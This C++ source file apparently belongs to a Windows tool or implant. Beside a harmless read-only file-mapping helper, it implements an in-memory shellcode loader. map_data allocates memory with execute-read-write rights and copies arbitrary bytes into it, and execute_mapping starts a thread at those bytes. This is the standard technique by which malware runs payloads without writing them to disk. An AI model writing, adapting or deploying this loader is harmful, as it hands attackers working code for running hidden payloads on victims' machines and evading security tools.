#include "core/extract/mapping.h"
#include "utils/debug_print.h"
#include <sstream>

namespace extract {

bool map_file_readonly(const std::string& file_path, void*& mapped_ptr, size_t& size) {
    debug::DebugPrint("Mapping file to memory: " + file_path);
    
    // Open file with read access
    HANDLE hFile = CreateFileA(file_path.c_str(), 
                             GENERIC_READ,
                             FILE_SHARE_READ,
                             NULL,
                             OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL,
                             NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        debug::DebugPrint("Failed to open file");
        return false;
    }

    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        debug::DebugPrint("Failed to get file size");
        CloseHandle(hFile);
        return false;
    }

    // Create file mapping with read-only access
    HANDLE hMapping = CreateFileMappingA(hFile,
                                       NULL,
                                       PAGE_READONLY,
                                       0,
                                       fileSize,
                                       NULL);
    if (!hMapping) {
        debug::DebugPrint("Failed to create file mapping");
        CloseHandle(hFile);
        return false;
    }

    // Map view of file with read-only access
    mapped_ptr = MapViewOfFile(hMapping,
                              FILE_MAP_READ,
                              0,
                              0,
                              fileSize);
    if (!mapped_ptr) {
        debug::DebugPrint("Failed to map view of file");
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // Store size
    size = fileSize;

    // Clean up handles - mapped memory will persist until UnmapViewOfFile
    CloseHandle(hMapping);
    CloseHandle(hFile);

    std::stringstream ss;
    ss << "File mapped successfully at address 0x" << std::hex << mapped_ptr;
    debug::DebugPrint(ss.str());
    
    return true;
}

bool map_data(const uint8_t* data, size_t size, void*& mapped_ptr) {
    debug::DebugPrint("Mapping data to memory...");
    
    // Allocate memory with execute permissions
    mapped_ptr = VirtualAlloc(nullptr, size, 
                            MEM_COMMIT | MEM_RESERVE, 
                            PAGE_EXECUTE_READWRITE);
    if (!mapped_ptr) {
        debug::DebugPrint("Failed to allocate memory for mapping");
        return false;
    }

    // Copy data to allocated memory
    memcpy(mapped_ptr, data, size);

    std::stringstream ss;
    ss << "Data mapped successfully at address 0x" << std::hex << mapped_ptr;
    debug::DebugPrint(ss.str());
    
    return true;
}

void execute_mapping(const std::vector<unsigned char>& data) {
    void* mapped_ptr = nullptr;

    debug::DebugPrint("Starting Local Mapping execution...");

    // Map data into memory
    if (!map_data(data.data(), data.size(), mapped_ptr)) {
        debug::DebugPrint("Failed to map data");
        return;
    }

    // Create thread to execute mapped data
    debug::DebugPrint("Creating thread to execute mapped data...");
    HANDLE hThread = CreateThread(nullptr, 0, 
                                (LPTHREAD_START_ROUTINE)mapped_ptr, 
                                nullptr, 0, nullptr);
    if (!hThread) {
        debug::DebugPrint("Failed to create thread");
        VirtualFree(mapped_ptr, 0, MEM_RELEASE);
        return;
    }

    // Close thread handle
    CloseHandle(hThread);

    debug::DebugPrint("Local Mapping execution completed");
    // Note: Mapped memory will be unmapped when process exits
    // We don't unmap it here since the thread is still running
}

} // namespace extract 